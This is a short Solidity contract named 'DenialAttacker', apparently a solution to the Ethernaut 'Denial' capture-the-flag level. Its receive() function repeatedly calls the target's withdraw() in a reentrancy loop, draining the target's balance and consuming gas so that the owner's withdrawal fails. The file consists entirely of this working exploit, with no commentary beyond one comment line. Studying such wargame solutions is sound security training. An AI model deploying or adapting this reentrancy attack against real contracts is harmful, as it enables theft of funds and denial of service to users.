pragma solidity ^0.8.0;

interface IDenial {
    function contractBalance() external view returns (uint);
    function withdraw() external;
}

contract DenialAttacker {

    IDenial denialContract;

    constructor(address denialAddress) {
        denialContract = IDenial(denialAddress);
    }

    // @dev reentrancy loop
    receive() external payable {
        if (denialContract.contractBalance() >= msg.value) {
            denialContract.withdraw();
        }
    }

}